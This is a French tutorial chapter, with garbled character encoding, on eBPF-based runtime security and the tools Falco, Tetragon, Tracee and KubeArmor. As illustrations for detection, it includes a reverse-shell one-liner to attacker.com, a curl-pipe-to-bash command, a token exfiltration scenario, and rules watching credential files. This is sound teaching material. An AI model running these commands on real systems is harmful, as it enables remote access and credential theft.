üîù Retour au [Sommaire](/SOMMAIRE.md)

# 21.3.3 S√©curit√© avec eBPF

## Introduction

La **s√©curit√©** est l'un des domaines o√π eBPF apporte les innovations les plus disruptives. Traditionnellement, la s√©curit√© des syst√®mes Linux reposait sur des approches **statiques** (pare-feu, SELinux) ou **r√©actives** (logs, alertes apr√®s coup). eBPF introduit une nouvelle dimension : la **runtime security** (s√©curit√© en temps d'ex√©cution).

Imaginez pouvoir :
- D√©tecter une attaque **au moment exact o√π elle se produit**, avant qu'elle ne cause des d√©g√¢ts
- Bloquer un processus malveillant **avant qu'il n'ex√©cute une commande dangereuse**
- Observer tous les comportements suspects **sans ralentir le syst√®me**
- D√©tecter des 0-days (vuln√©rabilit√©s inconnues) gr√¢ce √† l'**analyse comportementale**

C'est pr√©cis√©ment ce qu'eBPF rend possible.

---

## Les limites de la s√©curit√© traditionnelle sous Linux

### 1. **Approches statiques : Firewall et SELinux**

#### Pare-feu r√©seau (iptables, firewalld)

Les pare-feu bloquent les connexions r√©seau selon des **r√®gles pr√©d√©finies** :

```bash
# Bloquer tout le trafic sauf SSH
iptables -A INPUT -p tcp --dport 22 -j ACCEPT  
iptables -A INPUT -j DROP  
```

**Limitations :**
- ‚ùå Protection **uniquement r√©seau** (couche L3/L4)
- ‚ùå Pas de visibilit√© sur ce qui se passe **√† l'int√©rieur** de l'application
- ‚ùå Ne d√©tecte pas les attaques post-exploitation (shell reverse, lateral movement)

#### SELinux / AppArmor

Ces syst√®mes de contr√¥le d'acc√®s obligatoire (MAC) d√©finissent des **politiques** sur ce que chaque processus peut faire :

```
# Politique SELinux : httpd ne peut lire que /var/www
allow httpd_t httpd_sys_content_t:file { read open };
```

**Limitations :**
- ‚ùå Configuration **extr√™mement complexe** (souvent d√©sactiv√©e en production)
- ‚ùå Politiques **rigides** : difficile de d√©tecter des comportements anormaux
- ‚ùå Overhead de performance significatif
- ‚ùå Pas de visibilit√© granulaire sur les √©v√©nements

### 2. **Approches r√©actives : Logs et IDS**

#### Logs syst√®me

Les logs traditionnels (`/var/log/auth.log`, `syslog`) enregistrent des √©v√©nements :

```
Nov 27 10:30:15 server sshd[1234]: Failed password for root from 203.0.113.50
```

**Limitations :**
- ‚ùå **Apr√®s coup** : L'attaque a d√©j√† eu lieu
- ‚ùå **Incomplet** : Beaucoup d'√©v√©nements ne sont pas logg√©s
- ‚ùå **Facile √† contourner** : Un attaquant peut effacer les logs
- ‚ùå **Volume massif** : Difficile de trouver l'aiguille dans la botte de foin

#### IDS/IPS traditionnels (Snort, Suricata)

Ces syst√®mes analysent le trafic r√©seau √† la recherche de signatures d'attaques connues.

**Limitations :**
- ‚ùå **Signatures uniquement** : Ne d√©tecte que les attaques connues
- ‚ùå **Niveau r√©seau** : Pas de visibilit√© sur le comportement syst√®me
- ‚ùå **Faux positifs** : Beaucoup de bruit
- ‚ùå **Performance** : Inspection de paquets co√ªteuse

### 3. **Le probl√®me fondamental : Le manque de contexte**

Les outils traditionnels voient des **√©v√©nements isol√©s** sans comprendre le **contexte global** :

```
√âv√©nement : Le processus "bash" ex√©cute la commande "rm -rf /tmp/cache"
```

**Question** : Est-ce l√©gitime ou malveillant ?

- ‚úÖ **L√©gitime** : Script de nettoyage automatique ex√©cut√© par cron
- ‚ùå **Malveillant** : Attaquant ayant obtenu un shell via une vuln√©rabilit√© web

Les outils traditionnels ne peuvent **pas faire la diff√©rence**.

---

## Comment eBPF r√©volutionne la s√©curit√©

### 1. **Runtime Security : Observer tout en temps r√©el**

eBPF peut surveiller **tous les √©v√©nements syst√®me** avec un contexte complet :

| √âv√©nement | Informations captur√©es par eBPF |
|-----------|--------------------------------|
| **Ex√©cution de processus** | PID, PPID, UID, commande, arguments, variables d'environnement |
| **Acc√®s fichiers** | Chemin complet, permissions, flags (read/write/execute) |
| **Connexions r√©seau** | IP source/dest, ports, protocole, contenu (si L7) |
| **Appels syst√®me** | Tous les syscalls avec leurs arguments |
| **Modifications kernel** | Chargement de modules kernel, modification de tables syst√®me |

**Exemple de contexte riche :**

```
√âv√©nement : execve("/bin/bash", "-c", "curl http://attacker.com/backdoor.sh | bash")

Contexte eBPF :
  - Process name: apache2
  - PID: 8234
  - Parent PID: 1234 (apache2 main)
  - User: www-data
  - Container ID: 45a3b21c
  - Kubernetes pod: web-frontend-xyz
  - Namespace: production
  - Capabilities: CAP_NET_BIND_SERVICE
  - Previous syscalls: socket(), connect(), recv()

Verdict : üö® MALVEILLANT
  ‚Üí Un serveur web ne devrait JAMAIS ex√©cuter bash avec curl
  ‚Üí Probable exploitation d'une vuln√©rabilit√© (RCE)
```

Avec ce niveau de contexte, eBPF peut d√©terminer avec **quasi-certitude** qu'il s'agit d'une attaque.

### 2. **D√©tection comportementale : Apprendre le "normal"**

Au lieu de chercher des **signatures d'attaques connues**, eBPF peut apprendre le comportement **normal** de chaque application et d√©tecter les **anomalies**.

#### Exemple : Profiling d'une application

**Phase d'apprentissage** (7 jours) :

```
Application "nginx" :
  - Ex√©cute uniquement : nginx, nginx -s reload
  - Ouvre uniquement : /var/log/nginx/*.log, /etc/nginx/*.conf
  - Se connecte uniquement : upstream backends (ports 8080-8090)
  - N'ex√©cute JAMAIS : bash, sh, curl, wget
```

**D√©tection d'anomalie** :

```
üö® ALERTE : nginx (PID 5678) vient d'ex√©cuter "/bin/sh -c wget http://..."
Severity: CRITICAL  
Reason: Processus jamais observ√© sur cette application  
Action: BLOCK + ALERT  
```

### 3. **Enforcement : Bloquer avant l'ex√©cution**

Contrairement aux logs qui enregistrent **apr√®s coup**, eBPF peut **bloquer** une action avant qu'elle ne se produise.

**M√©canisme :**

```
Application tente d'ex√©cuter : execve("/bin/bash", ...)
         ‚Üì
[eBPF Program intercepts]
         ‚Üì
√âvaluation des policies :
  - Processus autoris√© ? NON
  - Contexte suspect ? OUI
         ‚Üì
DENY + Log + Alert
         ‚Üì
L'ex√©cution est BLOQU√âE
         ‚Üì
Attaque neutralis√©e AVANT qu'elle ne se produise
```

**Impact** : L'attaquant ne peut jamais obtenir son shell malveillant.

### 4. **Visibilit√© dans les conteneurs**

eBPF fonctionne au niveau **kernel**, ce qui lui permet de voir **√† travers les conteneurs** :

```
Container ID: a3f21b
  - Image: nginx:1.21
  - Pod: frontend-xyz
  - Namespace: production

√âv√©nements d√©tect√©s :
  ‚úÖ nginx (PID 10) : Comportement normal
  üö® bash (PID 42) : ANOMALIE - Processus inattendu dans ce conteneur
```

M√™me si un attaquant compromet un conteneur, eBPF le d√©tecte imm√©diatement.

---

## Les cas d'usage de s√©curit√© avec eBPF

### 1. **D√©tection d'exploits et de malwares**

#### Exemple 1 : D√©tection d'un Reverse Shell

Un reverse shell est une technique classique o√π un attaquant obtient un acc√®s distant √† un syst√®me compromis.

**Comportement typique d'un reverse shell :**

```bash
# Attaquant injecte cette commande via une vuln√©rabilit√© web
bash -i >& /dev/tcp/attacker.com/4444 0>&1
```

**D√©tection eBPF :**

```
üö® ALERTE : Reverse Shell d√©tect√©

√âv√©nements observ√©s :
1. execve("/bin/bash", "-i")
   - Parent: apache2 (PID 8234)
   - User: www-data

2. socket(AF_INET, SOCK_STREAM)
   - Connexion vers : 203.0.113.50:4444

3. dup2(socket_fd, STDIN/STDOUT/STDERR)
   - Redirection des I/O vers le socket

Pattern reconnu : 100% Reverse Shell  
Action : KILL process + ALERT + Isolation du conteneur  
```

#### Exemple 2 : D√©tection de Cryptominers

Les cryptominers malveillants consomment des ressources CPU pour miner de la cryptomonnaie.

**D√©tection eBPF :**

```
üö® ALERTE : Cryptominer suspect√©

Indicateurs :
- Processus inconnu : "xmrig" (jamais vu auparavant)
- CPU usage : 98% sur 4 c≈ìurs
- Connexions r√©seau : pool.minexmr.com:3333
- T√©l√©charg√© depuis : http://malicious-site.com/xmrig
- Parent process : apache2 (RCE probable)

Action : KILL + QUARANTINE
```

### 2. **D√©tection d'escalade de privil√®ges**

L'escalade de privil√®ges est une technique o√π un attaquant passe d'un utilisateur limit√© √† root.

#### Sc√©nario : Exploitation de sudo

```
üö® ALERTE : Tentative d'escalade de privil√®ges

S√©quence d√©tect√©e :
1. www-data ex√©cute : ./exploit-sudo (binaire inconnu)
2. exploit-sudo appelle : setuid(0)
3. setuid R√âUSSIT (normalement impossible pour www-data)
4. Nouveau shell : bash (UID=0)

Verdict : Vuln√©rabilit√© sudo exploit√©e (CVE-2023-xxxx ?)  
Action : BLOCK setuid + ALERT Security Team  
```

### 3. **D√©tection de mouvement lat√©ral**

Le mouvement lat√©ral est lorsqu'un attaquant, apr√®s avoir compromis une machine, se d√©place vers d'autres syst√®mes.

#### Exemple : SSH Brute Force interne

```
üö® ALERTE : Mouvement lat√©ral d√©tect√©

√âv√©nements :
- Host: frontend-pod-1
- Processus : ssh (PID 9876)
- Tentatives de connexion SSH vers :
  * 10.0.1.10:22 (backend-1)
  * 10.0.1.11:22 (backend-2)
  * 10.0.1.12:22 (backend-3)
- Fr√©quence : 50 tentatives/seconde
- Mot de passe : passwords.txt (fichier t√©l√©charg√©)

Pattern : SSH Brute Force interne  
Action : BLOCK outbound SSH + ISOLATE pod  
```

### 4. **D√©tection de Data Exfiltration**

L'exfiltration de donn√©es est lorsqu'un attaquant vole des informations sensibles.

#### Exemple : Vol de secrets Kubernetes

```
üö® ALERTE : Exfiltration de secrets

√âv√©nements :
1. Processus : curl (lanc√© par www-data)
2. Lecture : /var/run/secrets/kubernetes.io/serviceaccount/token
3. POST HTTP vers : http://attacker.com/exfil
4. Payload : 1024 bytes (taille du token JWT)

Verdict : Vol de credentials Kubernetes  
Action : REVOKE token + ALERT + BLOCK network  
```

### 5. **D√©tection de Rootkits**

Les rootkits se cachent dans le kernel pour dissimuler leur pr√©sence.

#### Exemple : Chargement de module kernel malveillant

```
üö® ALERTE : Rootkit suspect√©

√âv√©nements :
1. insmod /tmp/.hidden/backdoor.ko
2. Module charg√© : "netfilter_hook" (nom suspect)
3. Syscall interception d√©tect√©e :
   - syscall getdents64 modifi√© (cache des fichiers)
   - syscall read modifi√© (cache du contenu)
4. Pas de signature digitale sur le module

Verdict : Rootkit kernel  
Action : BLOCK insmod + Kernel Integrity Check + REBOOT  
```

---

## Les outils de s√©curit√© bas√©s sur eBPF

### 1. **Falco : L'IDS moderne**

**Falco** (cr√©√© par Sysdig, maintenant CNCF) est le standard de facto pour la runtime security dans Kubernetes.

#### Architecture de Falco

```
‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê
‚îÇ          Application / Container        ‚îÇ
‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î¨‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò
                 ‚îÇ
                 ‚ñº
         Appels syst√®me
                 ‚îÇ
                 ‚ñº
‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê
‚îÇ          eBPF Probe (kernel)            ‚îÇ
‚îÇ  - Capture syscalls                     ‚îÇ
‚îÇ  - Capture network events               ‚îÇ
‚îÇ  - Capture file events                  ‚îÇ
‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î¨‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò
                 ‚îÇ
                 ‚ñº
‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê
‚îÇ          Falco Engine                   ‚îÇ
‚îÇ  - Applique les r√®gles                  ‚îÇ
‚îÇ  - D√©tecte les anomalies                ‚îÇ
‚îÇ  - Enrichit le contexte (K8s)           ‚îÇ
‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î¨‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò
                 ‚îÇ
                 ‚ñº
‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê
‚îÇ          Alertes & Actions              ‚îÇ
‚îÇ  - Slack, PagerDuty                     ‚îÇ
‚îÇ  - Logs SIEM                            ‚îÇ
‚îÇ  - Webhook custom                       ‚îÇ
‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò
```

#### Exemples de r√®gles Falco

**R√®gle 1 : D√©tection de shell dans un conteneur**

```yaml
- rule: Terminal shell in container
  desc: Detect if a shell is spawned in a container
  condition: >
    spawned_process and
    container and
    proc.name in (bash, sh, zsh, csh, ksh)
  output: >
    Shell spawned in container
    (user=%user.name container=%container.name
     command=%proc.cmdline)
  priority: WARNING
```

**R√®gle 2 : D√©tection d'acc√®s √† des secrets**

```yaml
- rule: Read sensitive file in container
  desc: Detect access to sensitive files
  condition: >
    open_read and
    container and
    fd.name in (/etc/shadow, /etc/sudoers,
                 /root/.ssh/id_rsa)
  output: >
    Sensitive file opened for reading
    (user=%user.name file=%fd.name
     container=%container.name)
  priority: CRITICAL
```

**R√®gle 3 : D√©tection de processus inattendu**

```yaml
- rule: Unexpected process in web container
  desc: Detect processes that should not run in nginx
  condition: >
    spawned_process and
    container.image.repository = "nginx" and
    not proc.name in (nginx, sh)
  output: >
    Unexpected process in nginx container
    (process=%proc.name user=%user.name
     command=%proc.cmdline)
  priority: ERROR
```

#### D√©ploiement dans Kubernetes

```bash
# Installation via Helm
helm repo add falcosecurity https://falcosecurity.github.io/charts  
helm install falco falcosecurity/falco \  
  --namespace falco --create-namespace \
  --set ebpf.enabled=true
```

#### Exemple d'alerte Falco

```
10:45:23.123456789: Critical Shell spawned in container
  (user=root container_id=a3f21b container_name=nginx-xyz
   shell=/bin/bash parent=apache2 cmdline=bash -i
   k8s.ns=production k8s.pod=frontend-abc123)
```

### 2. **Tetragon : Policy Enforcement par Cilium**

**Tetragon** est un outil de s√©curit√© eBPF d√©velopp√© par Isovalent (l'entreprise derri√®re Cilium), ax√© sur l'**enforcement** (pas seulement la d√©tection, contrairement √† Falco).

#### Diff√©rences Falco vs Tetragon

| Aspect | Falco | Tetragon |
|--------|-------|----------|
| **Focus** | D√©tection + Alertes | Enforcement + Blocage |
| **Action** | Log + Notify | KILL process / DENY syscall |
| **Latence** | ~1 ms | < 100 ¬µs |
| **Performance** | Bonne | Excellente |
| **K8s native** | Oui | Oui (Cilium) |
| **Policies** | YAML | YAML + CRD K8s |

#### Exemple de policy Tetragon

```yaml
apiVersion: cilium.io/v1alpha1  
kind: TracingPolicy  
metadata:  
  name: block-suspicious-commands
spec:
  kprobes:
  - call: "sys_execve"
    syscall: true
    args:
    - index: 0
      type: "string"
    selectors:
    - matchBinaries:
      - operator: "In"
        values:
        - "/bin/bash"
        - "/bin/sh"
      matchActions:
      - action: Sigkill  # ‚Üê TUER le processus
        argFname: 0
        argName: 0
        matchArgs:
        - index: 0
          operator: "Prefix"
          values:
          - "curl http://"
          - "wget http://"
```

**R√©sultat** : Tout processus bash/sh qui tente d'ex√©cuter `curl http://` est **imm√©diatement tu√©**.

### 3. **Tracee : Security Observability**

**Tracee** (par Aqua Security) est un outil de tracing et d√©tection de menaces.

#### Fonctionnalit√©s uniques

- **Signatures de malwares** : Base de donn√©es de comportements malveillants connus
- **MITRE ATT&CK mapping** : Classifie les attaques selon le framework standard
- **Forensics** : Capture tous les √©v√©nements pour analyse post-incident

#### Exemple de d√©tection

```bash
$ tracee --output json --log info

{
  "timestamp": "2024-11-27T10:45:23.123Z",
  "signature": "Anti-Debugging Detected",
  "severity": "HIGH",
  "process": "suspicious_binary",
  "pid": 8234,
  "description": "Process attempted to detect debugger via ptrace",
  "mitre_attack": "T1622 - Debugger Evasion"
}
```

### 4. **KubeArmor : Container Runtime Security**

**KubeArmor** applique des politiques de s√©curit√© au niveau conteneur avec eBPF.

#### Exemple de policy

```yaml
apiVersion: security.kubearmor.com/v1  
kind: KubeArmorPolicy  
metadata:  
  name: block-pkg-mgmt-tools
  namespace: production
spec:
  selector:
    matchLabels:
      app: frontend
  process:
    matchPaths:
    - path: /usr/bin/apt
    - path: /usr/bin/apt-get
    - path: /bin/yum
  action: Block  # ‚Üê Bloquer l'utilisation de gestionnaires de paquets
```

**Cas d'usage** : Emp√™cher un attaquant d'installer des outils additionnels apr√®s compromise.

---

## Comparaison : S√©curit√© traditionnelle vs eBPF

### Tableau comparatif d√©taill√©

| Aspect | Outils traditionnels | eBPF-based Security |
|--------|---------------------|---------------------|
| **D√©tection** | Signatures d'attaques connues | Comportementale + Signatures |
| **Temps de r√©action** | Minutes/Heures (apr√®s analyse logs) | Temps r√©el (< 1 ms) |
| **Enforcement** | Non (ou via SELinux complexe) | Oui (KILL, DENY syscall) |
| **Contexte** | √âv√©nements isol√©s | Contexte complet (process tree, K8s) |
| **Faux positifs** | √âlev√©s | Faibles (contexte riche) |
| **Performance** | 5-20% overhead | < 1% overhead |
| **Visibilit√© conteneurs** | Limit√©e | Compl√®te et native |
| **0-day detection** | Non | Oui (via anomalies) |
| **Post-exploitation** | Peu efficace | Tr√®s efficace |

### Sc√©narios d'attaque : R√©ponse compar√©e

#### Sc√©nario : Exploitation d'une CVE web (RCE)

**Avec outils traditionnels :**

```
T+0s   : Exploitation r√©ussie  
T+1s   : Attaquant obtient shell  
T+10s  : Installation de backdoor  
T+1min : Escalade de privil√®ges  
T+10min: Mouvement lat√©ral  
T+2h   : D√©tection dans les logs (si chanceux)  
T+4h   : Incident response  
Result : Compromise compl√®te, donn√©es exfiltr√©es  
```

**Avec eBPF (Falco/Tetragon) :**

```
T+0s   : Exploitation r√©ussie  
T+0.001s : eBPF d√©tecte execve("/bin/bash") depuis apache2  
T+0.002s : ALERTE HIGH envoy√©e + Process KILLED (Tetragon)  
T+0.003s : Incident automatiquement logg√© avec contexte complet  
T+1min : Security team notifi√© avec toutes les informations  
Result : Attaque stopp√©e avant tout d√©g√¢t  
```

---

## Architecture d'une stack de s√©curit√© eBPF moderne

```
‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê
‚îÇ                    Kubernetes Cluster                  ‚îÇ
‚îú‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î§
‚îÇ                                                        ‚îÇ
‚îÇ  ‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê  ‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê  ‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê  ‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê    ‚îÇ
‚îÇ  ‚îÇ  Pod 1  ‚îÇ  ‚îÇ  Pod 2  ‚îÇ  ‚îÇ  Pod 3  ‚îÇ  ‚îÇ  Pod N  ‚îÇ    ‚îÇ
‚îÇ  ‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚î¨‚îÄ‚îÄ‚îÄ‚îÄ‚îò  ‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚î¨‚îÄ‚îÄ‚îÄ‚îÄ‚îò  ‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚î¨‚îÄ‚îÄ‚îÄ‚îÄ‚îò  ‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚î¨‚îÄ‚îÄ‚îÄ‚îÄ‚îò    ‚îÇ
‚îÇ       ‚îÇ            ‚îÇ            ‚îÇ            ‚îÇ         ‚îÇ
‚îÇ       ‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î¥‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î¥‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò         ‚îÇ
‚îÇ                         ‚îÇ                              ‚îÇ
‚îÇ                         ‚ñº                              ‚îÇ
‚îÇ  ‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê  ‚îÇ
‚îÇ  ‚îÇ         eBPF Security Layer (Kernel)             ‚îÇ  ‚îÇ
‚îÇ  ‚îú‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î§  ‚îÇ
‚îÇ  ‚îÇ                                                  ‚îÇ  ‚îÇ
‚îÇ  ‚îÇ  [Tetragon]     Policy Enforcement               ‚îÇ  ‚îÇ
‚îÇ  ‚îÇ   ‚îî‚îÄ KILL malicious processes                    ‚îÇ  ‚îÇ
‚îÇ  ‚îÇ   ‚îî‚îÄ DENY dangerous syscalls                     ‚îÇ  ‚îÇ
‚îÇ  ‚îÇ                                                  ‚îÇ  ‚îÇ
‚îÇ  ‚îÇ  [Falco]        Threat Detection                 ‚îÇ  ‚îÇ
‚îÇ  ‚îÇ   ‚îî‚îÄ Detect anomalies                            ‚îÇ  ‚îÇ
‚îÇ  ‚îÇ   ‚îî‚îÄ Generate alerts                             ‚îÇ  ‚îÇ
‚îÇ  ‚îÇ                                                  ‚îÇ  ‚îÇ
‚îÇ  ‚îÇ  [Tracee]       Forensics                        ‚îÇ  ‚îÇ
‚îÇ  ‚îÇ   ‚îî‚îÄ Capture all events                          ‚îÇ  ‚îÇ
‚îÇ  ‚îÇ   ‚îî‚îÄ MITRE ATT&CK mapping                        ‚îÇ  ‚îÇ
‚îÇ  ‚îÇ                                                  ‚îÇ  ‚îÇ
‚îÇ  ‚îÇ  [Cilium]       Network Security                 ‚îÇ  ‚îÇ
‚îÇ  ‚îÇ   ‚îî‚îÄ L7 policies                                 ‚îÇ  ‚îÇ
‚îÇ  ‚îÇ   ‚îî‚îÄ Encryption                                  ‚îÇ  ‚îÇ
‚îÇ  ‚îÇ                                                  ‚îÇ  ‚îÇ
‚îÇ  ‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î¨‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò  ‚îÇ
‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îº‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò
                          ‚îÇ
                          ‚ñº
‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê
‚îÇ              Security Operations Center (SOC)           ‚îÇ
